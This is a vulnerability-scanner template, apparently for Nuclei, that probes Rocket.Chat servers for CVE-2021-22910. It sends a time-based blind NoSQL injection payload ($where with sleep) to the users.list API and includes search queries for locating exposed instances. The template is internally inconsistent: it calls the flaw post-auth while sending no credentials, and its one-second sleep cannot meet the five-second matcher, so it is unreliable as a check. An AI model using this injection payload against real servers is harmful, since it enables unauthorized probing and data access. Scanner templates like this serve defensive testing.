id: CVE-2021-22910

info:
  name: Rocket.Chat Post-Auth Blind NoSQL Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: A sanitization vulnerability exists in Rocket.Chat server versions <3.13.2, <3.12.4, <3.11.4 that allowed queries to an endpoint which could result in a NoSQL injection, potentially leading to RCE.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive data.
  remediation: |
    Upgrade Rocket.Chat to the latest version to mitigate CVE-2021-22910.
  reference:
    - https://hackerone.com/reports/1130874
    - https://blog.sonarsource.com/nosql-injections-in-rocket-chat/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-22910
    cwe-id: CWE-75,NVD-CWE-Other
    epss-score: 0.00249
    epss-percentile: 0.65235
    cpe: cpe:2.3:a:rocket.chat:rocket.chat:*:*:*:*:*:*:*:*
  metadata:
    vendor: rocket.chat
    product: rocket.chat
    shodan-query: http.title:"Rocket.Chat"
    fofa-query: title="rocket.chat"
    google-query: intitle:"rocket.chat"
  tags: hackerone

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/v1/users.list"

    headers:
      Content-Type: "application/json"

    body: |
      {
        "query": "{\"$where\": \"this.username == 'admin' && sleep(1000)\"}"
      }
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
